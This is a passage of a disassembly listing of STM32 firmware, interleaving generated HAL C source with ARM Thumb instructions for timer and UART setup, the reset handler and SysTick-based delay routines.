  TIM_ClockConfigTypeDef sClockSourceConfig = {0};
 8000dc2:	f107 0310 	add.w	r3, r7, #16
 8000dc6:	2200      	movs	r2, #0
 8000dc8:	601a      	str	r2, [r3, #0]
 8000dca:	605a      	str	r2, [r3, #4]
 8000dcc:	609a      	str	r2, [r3, #8]
 8000dce:	60da      	str	r2, [r3, #12]
  TIM_MasterConfigTypeDef sMasterConfig = {0};
 8000dd0:	1d3b      	adds	r3, r7, #4
 8000dd2:	2200      	movs	r2, #0
 8000dd4:	601a      	str	r2, [r3, #0]
 8000dd6:	605a      	str	r2, [r3, #4]
 8000dd8:	609a      	str	r2, [r3, #8]

  /* USER CODE BEGIN TIM2_Init 1 */

  /* USER CODE END TIM2_Init 1 */
  htim2.Instance = TIM2;
 8000dda:	4b1e      	ldr	r3, [pc, #120]	; (8000e54 <MX_TIM2_Init+0x98>)
 8000ddc:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000de0:	601a      	str	r2, [r3, #0]
  htim2.Init.Prescaler = 7199;
 8000de2:	4b1c      	ldr	r3, [pc, #112]	; (8000e54 <MX_TIM2_Init+0x98>)
 8000de4:	f641 421f 	movw	r2, #7199	; 0x1c1f
 8000de8:	605a      	str	r2, [r3, #4]
  htim2.Init.CounterMode = TIM_COUNTERMODE_UP;
 8000dea:	4b1a      	ldr	r3, [pc, #104]	; (8000e54 <MX_TIM2_Init+0x98>)
 8000dec:	2200      	movs	r2, #0
 8000dee:	609a      	str	r2, [r3, #8]
  htim2.Init.Period = 399;
 8000df0:	4b18      	ldr	r3, [pc, #96]	; (8000e54 <MX_TIM2_Init+0x98>)
 8000df2:	f240 128f 	movw	r2, #399	; 0x18f
 8000df6:	60da      	str	r2, [r3, #12]
  htim2.Init.ClockDivision = TIM_CLOCKDIVISION_DIV1;
 8000df8:	4b16      	ldr	r3, [pc, #88]	; (8000e54 <MX_TIM2_Init+0x98>)
 8000dfa:	2200      	movs	r2, #0
 8000dfc:	611a      	str	r2, [r3, #16]
  htim2.Init.AutoReloadPreload = TIM_AUTORELOAD_PRELOAD_DISABLE;
 8000dfe:	4b15      	ldr	r3, [pc, #84]	; (8000e54 <MX_TIM2_Init+0x98>)
 8000e00:	2200      	movs	r2, #0
 8000e02:	619a      	str	r2, [r3, #24]
  if (HAL_TIM_Base_Init(&htim2) != HAL_OK)
 8000e04:	4813      	ldr	r0, [pc, #76]	; (8000e54 <MX_TIM2_Init+0x98>)
 8000e06:	f003 fece 	bl	8004ba6 <HAL_TIM_Base_Init>
 8000e0a:	4603      	mov	r3, r0
 8000e0c:	2b00      	cmp	r3, #0
 8000e0e:	d001      	beq.n	8000e14 <MX_TIM2_Init+0x58>
  {
    Error_Handler();
 8000e10:	f7ff feda 	bl	8000bc8 <Error_Handler>
  }
  sClockSourceConfig.ClockSource = TIM_CLOCKSOURCE_INTERNAL;
 8000e14:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8000e18:	613b      	str	r3, [r7, #16]
  if (HAL_TIM_ConfigClockSource(&htim2, &sClockSourceConfig) != HAL_OK)
 8000e1a:	f107 0310 	add.w	r3, r7, #16
 8000e1e:	4619      	mov	r1, r3
 8000e20:	480c      	ldr	r0, [pc, #48]	; (8000e54 <MX_TIM2_Init+0x98>)
 8000e22:	f004 f86d 	bl	8004f00 <HAL_TIM_ConfigClockSource>
 8000e26:	4603      	mov	r3, r0
 8000e28:	2b00      	cmp	r3, #0
 8000e2a:	d001      	beq.n	8000e30 <MX_TIM2_Init+0x74>
  {
    Error_Handler();
 8000e2c:	f7ff fecc 	bl	8000bc8 <Error_Handler>
  }
  sMasterConfig.MasterOutputTrigger = TIM_TRGO_RESET;
 8000e30:	2300      	movs	r3, #0
 8000e32:	607b      	str	r3, [r7, #4]
  sMasterConfig.MasterSlaveMode = TIM_MASTERSLAVEMODE_DISABLE;
 8000e34:	2300      	movs	r3, #0
 8000e36:	60fb      	str	r3, [r7, #12]
  if (HAL_TIMEx_MasterConfigSynchronization(&htim2, &sMasterConfig) != HAL_OK)
 8000e38:	1d3b      	adds	r3, r7, #4
 8000e3a:	4619      	mov	r1, r3
 8000e3c:	4805      	ldr	r0, [pc, #20]	; (8000e54 <MX_TIM2_Init+0x98>)
 8000e3e:	f004 fa4f 	bl	80052e0 <HAL_TIMEx_MasterConfigSynchronization>
 8000e42:	4603      	mov	r3, r0
 8000e44:	2b00      	cmp	r3, #0
 8000e46:	d001      	beq.n	8000e4c <MX_TIM2_Init+0x90>
  {
    Error_Handler();
 8000e48:	f7ff febe 	bl	8000bc8 <Error_Handler>
  }
  /* USER CODE BEGIN TIM2_Init 2 */

  /* USER CODE END TIM2_Init 2 */

}
 8000e4c:	bf00      	nop
 8000e4e:	3720      	adds	r7, #32
 8000e50:	46bd      	mov	sp, r7
 8000e52:	bd80      	pop	{r7, pc}
 8000e54:	200002e4 	.word	0x200002e4

08000e58 <HAL_TIM_Base_MspInit>:

void HAL_TIM_Base_MspInit(TIM_HandleTypeDef* tim_baseHandle)
{
 8000e58:	b580      	push	{r7, lr}
 8000e5a:	b084      	sub	sp, #16
 8000e5c:	af00      	add	r7, sp, #0
 8000e5e:	6078      	str	r0, [r7, #4]

  if(tim_baseHandle->Instance==TIM2)
 8000e60:	687b      	ldr	r3, [r7, #4]
 8000e62:	681b      	ldr	r3, [r3, #0]
 8000e64:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8000e68:	d113      	bne.n	8000e92 <HAL_TIM_Base_MspInit+0x3a>
  {
  /* USER CODE BEGIN TIM2_MspInit 0 */

  /* USER CODE END TIM2_MspInit 0 */
    /* TIM2 clock enable */
    __HAL_RCC_TIM2_CLK_ENABLE();
 8000e6a:	4b0c      	ldr	r3, [pc, #48]	; (8000e9c <HAL_TIM_Base_MspInit+0x44>)
 8000e6c:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000e6e:	4a0b      	ldr	r2, [pc, #44]	; (8000e9c <HAL_TIM_Base_MspInit+0x44>)
 8000e70:	f043 0301 	orr.w	r3, r3, #1
 8000e74:	6593      	str	r3, [r2, #88]	; 0x58
 8000e76:	4b09      	ldr	r3, [pc, #36]	; (8000e9c <HAL_TIM_Base_MspInit+0x44>)
 8000e78:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000e7a:	f003 0301 	and.w	r3, r3, #1
 8000e7e:	60fb      	str	r3, [r7, #12]
 8000e80:	68fb      	ldr	r3, [r7, #12]

    /* TIM2 interrupt Init */
    HAL_NVIC_SetPriority(TIM2_IRQn, 0, 0);
 8000e82:	2200      	movs	r2, #0
 8000e84:	2100      	movs	r1, #0
 8000e86:	201c      	movs	r0, #28
 8000e88:	f000 fa41 	bl	800130e <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(TIM2_IRQn);
 8000e8c:	201c      	movs	r0, #28
 8000e8e:	f000 fa5a 	bl	8001346 <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN TIM2_MspInit 1 */

  /* USER CODE END TIM2_MspInit 1 */
  }
}
 8000e92:	bf00      	nop
 8000e94:	3710      	adds	r7, #16
 8000e96:	46bd      	mov	sp, r7
 8000e98:	bd80      	pop	{r7, pc}
 8000e9a:	bf00      	nop
 8000e9c:	40021000 	.word	0x40021000

08000ea0 <MX_USART2_UART_Init>:
UART_HandleTypeDef huart2;

/* USART2 init function */

void MX_USART2_UART_Init(void)
{
 8000ea0:	b580      	push	{r7, lr}
 8000ea2:	af00      	add	r7, sp, #0
  /* USER CODE END USART2_Init 0 */

  /* USER CODE BEGIN USART2_Init 1 */

  /* USER CODE END USART2_Init 1 */
  huart2.Instance = USART2;
 8000ea4:	4b14      	ldr	r3, [pc, #80]	; (8000ef8 <MX_USART2_UART_Init+0x58>)
 8000ea6:	4a15      	ldr	r2, [pc, #84]	; (8000efc <MX_USART2_UART_Init+0x5c>)
 8000ea8:	601a      	str	r2, [r3, #0]
  huart2.Init.BaudRate = 115200;
 8000eaa:	4b13      	ldr	r3, [pc, #76]	; (8000ef8 <MX_USART2_UART_Init+0x58>)
 8000eac:	f44f 32e1 	mov.w	r2, #115200	; 0x1c200
 8000eb0:	605a      	str	r2, [r3, #4]
  huart2.Init.WordLength = UART_WORDLENGTH_8B;
 8000eb2:	4b11      	ldr	r3, [pc, #68]	; (8000ef8 <MX_USART2_UART_Init+0x58>)
 8000eb4:	2200      	movs	r2, #0
 8000eb6:	609a      	str	r2, [r3, #8]
  huart2.Init.StopBits = UART_STOPBITS_1;
 8000eb8:	4b0f      	ldr	r3, [pc, #60]	; (8000ef8 <MX_USART2_UART_Init+0x58>)
 8000eba:	2200      	movs	r2, #0
 8000ebc:	60da      	str	r2, [r3, #12]
  huart2.Init.Parity = UART_PARITY_NONE;
 8000ebe:	4b0e      	ldr	r3, [pc, #56]	; (8000ef8 <MX_USART2_UART_Init+0x58>)
 8000ec0:	2200      	movs	r2, #0
 8000ec2:	611a      	str	r2, [r3, #16]
  huart2.Init.Mode = UART_MODE_TX_RX;
 8000ec4:	4b0c      	ldr	r3, [pc, #48]	; (8000ef8 <MX_USART2_UART_Init+0x58>)
 8000ec6:	220c      	movs	r2, #12
 8000ec8:	615a      	str	r2, [r3, #20]
  huart2.Init.HwFlowCtl = UART_HWCONTROL_NONE;
 8000eca:	4b0b      	ldr	r3, [pc, #44]	; (8000ef8 <MX_USART2_UART_Init+0x58>)
 8000ecc:	2200      	movs	r2, #0
 8000ece:	619a      	str	r2, [r3, #24]
  huart2.Init.OverSampling = UART_OVERSAMPLING_16;
 8000ed0:	4b09      	ldr	r3, [pc, #36]	; (8000ef8 <MX_USART2_UART_Init+0x58>)
 8000ed2:	2200      	movs	r2, #0
 8000ed4:	61da      	str	r2, [r3, #28]
  huart2.Init.OneBitSampling = UART_ONE_BIT_SAMPLE_DISABLE;
 8000ed6:	4b08      	ldr	r3, [pc, #32]	; (8000ef8 <MX_USART2_UART_Init+0x58>)
 8000ed8:	2200      	movs	r2, #0
 8000eda:	621a      	str	r2, [r3, #32]
  huart2.AdvancedInit.AdvFeatureInit = UART_ADVFEATURE_NO_INIT;
 8000edc:	4b06      	ldr	r3, [pc, #24]	; (8000ef8 <MX_USART2_UART_Init+0x58>)
 8000ede:	2200      	movs	r2, #0
 8000ee0:	625a      	str	r2, [r3, #36]	; 0x24
  if (HAL_UART_Init(&huart2) != HAL_OK)
 8000ee2:	4805      	ldr	r0, [pc, #20]	; (8000ef8 <MX_USART2_UART_Init+0x58>)
 8000ee4:	f004 fa80 	bl	80053e8 <HAL_UART_Init>
 8000ee8:	4603      	mov	r3, r0
 8000eea:	2b00      	cmp	r3, #0
 8000eec:	d001      	beq.n	8000ef2 <MX_USART2_UART_Init+0x52>
  {
    Error_Handler();
 8000eee:	f7ff fe6b 	bl	8000bc8 <Error_Handler>
  }
  /* USER CODE BEGIN USART2_Init 2 */

  /* USER CODE END USART2_Init 2 */

}
 8000ef2:	bf00      	nop
 8000ef4:	bd80      	pop	{r7, pc}
 8000ef6:	bf00      	nop
 8000ef8:	20000330 	.word	0x20000330
 8000efc:	40004400 	.word	0x40004400

08000f00 <HAL_UART_MspInit>:

void HAL_UART_MspInit(UART_HandleTypeDef* uartHandle)
{
 8000f00:	b580      	push	{r7, lr}
 8000f02:	b09e      	sub	sp, #120	; 0x78
 8000f04:	af00      	add	r7, sp, #0
 8000f06:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8000f08:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8000f0c:	2200      	movs	r2, #0
 8000f0e:	601a      	str	r2, [r3, #0]
 8000f10:	605a      	str	r2, [r3, #4]
 8000f12:	609a      	str	r2, [r3, #8]
 8000f14:	60da      	str	r2, [r3, #12]
 8000f16:	611a      	str	r2, [r3, #16]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 8000f18:	f107 0310 	add.w	r3, r7, #16
 8000f1c:	2254      	movs	r2, #84	; 0x54
 8000f1e:	2100      	movs	r1, #0
 8000f20:	4618      	mov	r0, r3
 8000f22:	f00b ffff 	bl	800cf24 <memset>
  if(uartHandle->Instance==USART2)
 8000f26:	687b      	ldr	r3, [r7, #4]
 8000f28:	681b      	ldr	r3, [r3, #0]
 8000f2a:	4a28      	ldr	r2, [pc, #160]	; (8000fcc <HAL_UART_MspInit+0xcc>)
 8000f2c:	4293      	cmp	r3, r2
 8000f2e:	d148      	bne.n	8000fc2 <HAL_UART_MspInit+0xc2>

  /* USER CODE END USART2_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USART2;
 8000f30:	2302      	movs	r3, #2
 8000f32:	613b      	str	r3, [r7, #16]
    PeriphClkInit.Usart2ClockSelection = RCC_USART2CLKSOURCE_PCLK1;
 8000f34:	2300      	movs	r3, #0
 8000f36:	637b      	str	r3, [r7, #52]	; 0x34
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 8000f38:	f107 0310 	add.w	r3, r7, #16
 8000f3c:	4618      	mov	r0, r3
 8000f3e:	f003 fa97 	bl	8004470 <HAL_RCCEx_PeriphCLKConfig>
 8000f42:	4603      	mov	r3, r0
 8000f44:	2b00      	cmp	r3, #0
 8000f46:	d001      	beq.n	8000f4c <HAL_UART_MspInit+0x4c>
    {
      Error_Handler();
 8000f48:	f7ff fe3e 	bl	8000bc8 <Error_Handler>
    }

    /* USART2 clock enable */
    __HAL_RCC_USART2_CLK_ENABLE();
 8000f4c:	4b20      	ldr	r3, [pc, #128]	; (8000fd0 <HAL_UART_MspInit+0xd0>)
 8000f4e:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000f50:	4a1f      	ldr	r2, [pc, #124]	; (8000fd0 <HAL_UART_MspInit+0xd0>)
 8000f52:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 8000f56:	6593      	str	r3, [r2, #88]	; 0x58
 8000f58:	4b1d      	ldr	r3, [pc, #116]	; (8000fd0 <HAL_UART_MspInit+0xd0>)
 8000f5a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000f5c:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8000f60:	60fb      	str	r3, [r7, #12]
 8000f62:	68fb      	ldr	r3, [r7, #12]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 8000f64:	4b1a      	ldr	r3, [pc, #104]	; (8000fd0 <HAL_UART_MspInit+0xd0>)
 8000f66:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000f68:	4a19      	ldr	r2, [pc, #100]	; (8000fd0 <HAL_UART_MspInit+0xd0>)
 8000f6a:	f043 0301 	orr.w	r3, r3, #1
 8000f6e:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000f70:	4b17      	ldr	r3, [pc, #92]	; (8000fd0 <HAL_UART_MspInit+0xd0>)
 8000f72:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000f74:	f003 0301 	and.w	r3, r3, #1
 8000f78:	60bb      	str	r3, [r7, #8]
 8000f7a:	68bb      	ldr	r3, [r7, #8]
    /**USART2 GPIO Configuration
    PA2     ------> USART2_TX
    PA15 (JTDI)     ------> USART2_RX
    */
    GPIO_InitStruct.Pin = VCP_TX_Pin;
 8000f7c:	2304      	movs	r3, #4
 8000f7e:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8000f80:	2302      	movs	r3, #2
 8000f82:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000f84:	2300      	movs	r3, #0
 8000f86:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8000f88:	2303      	movs	r3, #3
 8000f8a:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF7_USART2;
 8000f8c:	2307      	movs	r3, #7
 8000f8e:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_TX_GPIO_Port, &GPIO_InitStruct);
 8000f90:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8000f94:	4619      	mov	r1, r3
 8000f96:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000f9a:	f000 fc67 	bl	800186c <HAL_GPIO_Init>

    GPIO_InitStruct.Pin = VCP_RX_Pin;
 8000f9e:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8000fa2:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8000fa4:	2302      	movs	r3, #2
 8000fa6:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000fa8:	2300      	movs	r3, #0
 8000faa:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8000fac:	2303      	movs	r3, #3
 8000fae:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF3_USART2;
 8000fb0:	2303      	movs	r3, #3
 8000fb2:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_RX_GPIO_Port, &GPIO_InitStruct);
 8000fb4:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8000fb8:	4619      	mov	r1, r3
 8000fba:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000fbe:	f000 fc55 	bl	800186c <HAL_GPIO_Init>

  /* USER CODE BEGIN USART2_MspInit 1 */

  /* USER CODE END USART2_MspInit 1 */
  }
}
 8000fc2:	bf00      	nop
 8000fc4:	3778      	adds	r7, #120	; 0x78
 8000fc6:	46bd      	mov	sp, r7
 8000fc8:	bd80      	pop	{r7, pc}
 8000fca:	bf00      	nop
 8000fcc:	40004400 	.word	0x40004400
 8000fd0:	40021000 	.word	0x40021000

08000fd4 <Reset_Handler>:

    .section	.text.Reset_Handler
	.weak	Reset_Handler
	.type	Reset_Handler, %function
Reset_Handler:
  ldr   sp, =_estack    /* Set stack pointer */
 8000fd4:	f8df d034 	ldr.w	sp, [pc, #52]	; 800100c <LoopForever+0x2>

/* Call the clock system initialization function.*/
    bl  SystemInit
 8000fd8:	f7ff fede 	bl	8000d98 <SystemInit>

/* Copy the data segment initializers from flash to SRAM */
  ldr r0, =_sdata
 8000fdc:	480c      	ldr	r0, [pc, #48]	; (8001010 <LoopForever+0x6>)
  ldr r1, =_edata
 8000fde:	490d      	ldr	r1, [pc, #52]	; (8001014 <LoopForever+0xa>)
  ldr r2, =_sidata
 8000fe0:	4a0d      	ldr	r2, [pc, #52]	; (8001018 <LoopForever+0xe>)
  movs r3, #0
 8000fe2:	2300      	movs	r3, #0
  b LoopCopyDataInit
 8000fe4:	e002      	b.n	8000fec <LoopCopyDataInit>

08000fe6 <CopyDataInit>:

CopyDataInit:
  ldr r4, [r2, r3]
 8000fe6:	58d4      	ldr	r4, [r2, r3]
  str r4, [r0, r3]
 8000fe8:	50c4      	str	r4, [r0, r3]
  adds r3, r3, #4
 8000fea:	3304      	adds	r3, #4

08000fec <LoopCopyDataInit>:

LoopCopyDataInit:
  adds r4, r0, r3
 8000fec:	18c4      	adds	r4, r0, r3
  cmp r4, r1
 8000fee:	428c      	cmp	r4, r1
  bcc CopyDataInit
 8000ff0:	d3f9      	bcc.n	8000fe6 <CopyDataInit>
  
/* Zero fill the bss segment. */
  ldr r2, =_sbss
 8000ff2:	4a0a      	ldr	r2, [pc, #40]	; (800101c <LoopForever+0x12>)
  ldr r4, =_ebss
 8000ff4:	4c0a      	ldr	r4, [pc, #40]	; (8001020 <LoopForever+0x16>)
  movs r3, #0
 8000ff6:	2300      	movs	r3, #0
  b LoopFillZerobss
 8000ff8:	e001      	b.n	8000ffe <LoopFillZerobss>

08000ffa <FillZerobss>:

FillZerobss:
  str  r3, [r2]
 8000ffa:	6013      	str	r3, [r2, #0]
  adds r2, r2, #4
 8000ffc:	3204      	adds	r2, #4

08000ffe <LoopFillZerobss>:

LoopFillZerobss:
  cmp r2, r4
 8000ffe:	42a2      	cmp	r2, r4
  bcc FillZerobss
 8001000:	d3fb      	bcc.n	8000ffa <FillZerobss>

/* Call static constructors */
    bl __libc_init_array
 8001002:	f00b ff97 	bl	800cf34 <__libc_init_array>
/* Call the application's entry point.*/
	bl	main
 8001006:	f7ff fabf 	bl	8000588 <main>

0800100a <LoopForever>:

LoopForever:
    b LoopForever
 800100a:	e7fe      	b.n	800100a <LoopForever>
  ldr   sp, =_estack    /* Set stack pointer */
 800100c:	20010000 	.word	0x20010000
  ldr r0, =_sdata
 8001010:	20000000 	.word	0x20000000
  ldr r1, =_edata
 8001014:	20000240 	.word	0x20000240
  ldr r2, =_sidata
 8001018:	0800d144 	.word	0x0800d144
  ldr r2, =_sbss
 800101c:	20000240 	.word	0x20000240
  ldr r4, =_ebss
 8001020:	20001f14 	.word	0x20001f14

08001024 <ADC1_IRQHandler>:
 * @retval : None
*/
    .section	.text.Default_Handler,"ax",%progbits
Default_Handler:
Infinite_Loop:
	b	Infinite_Loop
 8001024:	e7fe      	b.n	8001024 <ADC1_IRQHandler>

08001026 <HAL_Init>:
  *         each 1ms in the SysTick_Handler() interrupt handler.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_Init(void)
{
 8001026:	b580      	push	{r7, lr}
 8001028:	b082      	sub	sp, #8
 800102a:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef  status = HAL_OK;
 800102c:	2300      	movs	r3, #0
 800102e:	71fb      	strb	r3, [r7, #7]
#if (PREFETCH_ENABLE != 0)
  __HAL_FLASH_PREFETCH_BUFFER_ENABLE();
#endif /* PREFETCH_ENABLE */

  /* Set Interrupt Group Priority */
  HAL_NVIC_SetPriorityGrouping(NVIC_PRIORITYGROUP_4);
 8001030:	2003      	movs	r0, #3
 8001032:	f000 f961 	bl	80012f8 <HAL_NVIC_SetPriorityGrouping>

  /* Use SysTick as time base source and configure 1ms tick (default clock after Reset is MSI) */
  if (HAL_InitTick(TICK_INT_PRIORITY) != HAL_OK)
 8001036:	2000      	movs	r0, #0
 8001038:	f000 f80e 	bl	8001058 <HAL_InitTick>
 800103c:	4603      	mov	r3, r0
 800103e:	2b00      	cmp	r3, #0
 8001040:	d002      	beq.n	8001048 <HAL_Init+0x22>
  {
    status = HAL_ERROR;
 8001042:	2301      	movs	r3, #1
 8001044:	71fb      	strb	r3, [r7, #7]
 8001046:	e001      	b.n	800104c <HAL_Init+0x26>
  }
  else
  {
    /* Init the low level hardware */
    HAL_MspInit();
 8001048:	f7ff fe44 	bl	8000cd4 <HAL_MspInit>
  }

  /* Return function status */
  return status;
 800104c:	79fb      	ldrb	r3, [r7, #7]
}
 800104e:	4618      	mov	r0, r3
 8001050:	3708      	adds	r7, #8
 8001052:	46bd      	mov	sp, r7
 8001054:	bd80      	pop	{r7, pc}
	...

08001058 <HAL_InitTick>:
  *       implementation  in user file.
  * @param TickPriority  Tick interrupt priority.
  * @retval HAL status
  */
__weak HAL_StatusTypeDef HAL_InitTick(uint32_t TickPriority)
{
 8001058:	b580      	push	{r7, lr}
 800105a:	b084      	sub	sp, #16
 800105c:	af00      	add	r7, sp, #0
 800105e:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef  status = HAL_OK;
 8001060:	2300      	movs	r3, #0
 8001062:	73fb      	strb	r3, [r7, #15]

  /* Check uwTickFreq for MisraC 2012 (even if uwTickFreq is a enum type that doesn't take the value zero)*/
  if ((uint32_t)uwTickFreq != 0U)
 8001064:	4b17      	ldr	r3, [pc, #92]	; (80010c4 <HAL_InitTick+0x6c>)
 8001066:	781b      	ldrb	r3, [r3, #0]
 8001068:	2b00      	cmp	r3, #0
 800106a:	d023      	beq.n	80010b4 <HAL_InitTick+0x5c>
  {
    /*Configure the SysTick to have interrupt in 1ms time basis*/
    if (HAL_SYSTICK_Config(SystemCoreClock / (1000U / (uint32_t)uwTickFreq)) == 0U)
 800106c:	4b16      	ldr	r3, [pc, #88]	; (80010c8 <HAL_InitTick+0x70>)
 800106e:	681a      	ldr	r2, [r3, #0]
 8001070:	4b14      	ldr	r3, [pc, #80]	; (80010c4 <HAL_InitTick+0x6c>)
 8001072:	781b      	ldrb	r3, [r3, #0]
 8001074:	4619      	mov	r1, r3
 8001076:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 800107a:	fbb3 f3f1 	udiv	r3, r3, r1
 800107e:	fbb2 f3f3 	udiv	r3, r2, r3
 8001082:	4618      	mov	r0, r3
 8001084:	f000 f96d 	bl	8001362 <HAL_SYSTICK_Config>
 8001088:	4603      	mov	r3, r0
 800108a:	2b00      	cmp	r3, #0
 800108c:	d10f      	bne.n	80010ae <HAL_InitTick+0x56>
    {
      /* Configure the SysTick IRQ priority */
      if (TickPriority < (1UL << __NVIC_PRIO_BITS))
 800108e:	687b      	ldr	r3, [r7, #4]
 8001090:	2b0f      	cmp	r3, #15
 8001092:	d809      	bhi.n	80010a8 <HAL_InitTick+0x50>
      {
        HAL_NVIC_SetPriority(SysTick_IRQn, TickPriority, 0U);
 8001094:	2200      	movs	r2, #0
 8001096:	6879      	ldr	r1, [r7, #4]
 8001098:	f04f 30ff 	mov.w	r0, #4294967295
 800109c:	f000 f937 	bl	800130e <HAL_NVIC_SetPriority>
        uwTickPrio = TickPriority;
 80010a0:	4a0a      	ldr	r2, [pc, #40]	; (80010cc <HAL_InitTick+0x74>)
 80010a2:	687b      	ldr	r3, [r7, #4]
 80010a4:	6013      	str	r3, [r2, #0]
 80010a6:	e007      	b.n	80010b8 <HAL_InitTick+0x60>
      }
      else
      {
        status = HAL_ERROR;
 80010a8:	2301      	movs	r3, #1
 80010aa:	73fb      	strb	r3, [r7, #15]
 80010ac:	e004      	b.n	80010b8 <HAL_InitTick+0x60>
      }
    }
    else
    {
      status = HAL_ERROR;
 80010ae:	2301      	movs	r3, #1
 80010b0:	73fb      	strb	r3, [r7, #15]
 80010b2:	e001      	b.n	80010b8 <HAL_InitTick+0x60>
    }
  }
  else
  {
    status = HAL_ERROR;
 80010b4:	2301      	movs	r3, #1
 80010b6:	73fb      	strb	r3, [r7, #15]
  }

  /* Return function status */
  return status;
 80010b8:	7bfb      	ldrb	r3, [r7, #15]
}
 80010ba:	4618      	mov	r0, r3
 80010bc:	3710      	adds	r7, #16
 80010be:	46bd      	mov	sp, r7
 80010c0:	bd80      	pop	{r7, pc}
 80010c2:	bf00      	nop
 80010c4:	20000008 	.word	0x20000008
 80010c8:	20000000 	.word	0x20000000
 80010cc:	20000004 	.word	0x20000004

080010d0 <HAL_IncTick>:
 * @note This function is declared as __weak to be overwritten in case of other
  *      implementations in user file.
  * @retval None
  */
__weak void HAL_IncTick(void)
{
 80010d0:	b480      	push	{r7}
 80010d2:	af00      	add	r7, sp, #0
  uwTick += (uint32_t)uwTickFreq;
 80010d4:	4b06      	ldr	r3, [pc, #24]	; (80010f0 <HAL_IncTick+0x20>)
 80010d6:	781b      	ldrb	r3, [r3, #0]
 80010d8:	461a      	mov	r2, r3
 80010da:	4b06      	ldr	r3, [pc, #24]	; (80010f4 <HAL_IncTick+0x24>)
 80010dc:	681b      	ldr	r3, [r3, #0]
 80010de:	4413      	add	r3, r2
 80010e0:	4a04      	ldr	r2, [pc, #16]	; (80010f4 <HAL_IncTick+0x24>)
 80010e2:	6013      	str	r3, [r2, #0]
}
 80010e4:	bf00      	nop
 80010e6:	46bd      	mov	sp, r7
 80010e8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80010ec:	4770      	bx	lr
 80010ee:	bf00      	nop
 80010f0:	20000008 	.word	0x20000008
 80010f4:	200003b8 	.word	0x200003b8

080010f8 <HAL_GetTick>:
  * @note This function is declared as __weak to be overwritten in case of other
  *       implementations in user file.
  * @retval tick value
  */
__weak uint32_t HAL_GetTick(void)
{
 80010f8:	b480      	push	{r7}
 80010fa:	af00      	add	r7, sp, #0
  return uwTick;
 80010fc:	4b03      	ldr	r3, [pc, #12]	; (800110c <HAL_GetTick+0x14>)
 80010fe:	681b      	ldr	r3, [r3, #0]
}
 8001100:	4618      	mov	r0, r3
 8001102:	46bd      	mov	sp, r7
 8001104:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001108:	4770      	bx	lr
 800110a:	bf00      	nop
 800110c:	200003b8 	.word	0x200003b8

08001110 <HAL_Delay>:
  *       implementations in user file.
  * @param Delay  specifies the delay time length, in milliseconds.
  * @retval None
  */
__weak void HAL_Delay(uint32_t Delay)
{
 8001110:	b580      	push	{r7, lr}
 8001112:	b084      	sub	sp, #16
 8001114:	af00      	add	r7, sp, #0
 8001116:	6078      	str	r0, [r7, #4]
  uint32_t tickstart = HAL_GetTick();
 8001118:	f7ff ffee 	bl	80010f8 <HAL_GetTick>
 800111c:	60b8      	str	r0, [r7, #8]
  uint32_t wait = Delay;
 800111e:	687b      	ldr	r3, [r7, #4]
 8001120:	60fb      	str	r3, [r7, #12]

  /* Add a period to guaranty minimum wait */
  if (wait < HAL_MAX_DELAY)
 8001122:	68fb      	ldr	r3, [r7, #12]
 8001124:	f1b3 3fff 	cmp.w	r3, #4294967295
 8001128:	d005      	beq.n	8001136 <HAL_Delay+0x26>
  {
    wait += (uint32_t)uwTickFreq;
 800112a:	4b0a      	ldr	r3, [pc, #40]	; (8001154 <HAL_Delay+0x44>)
 800112c:	781b      	ldrb	r3, [r3, #0]
 800112e:	461a      	mov	r2, r3
 8001130:	68fb      	ldr	r3, [r7, #12]
 8001132:	4413      	add	r3, r2
 8001134:	60fb      	str	r3, [r7, #12]
  }

  while ((HAL_GetTick() - tickstart) < wait)
 8001136:	bf00      	nop
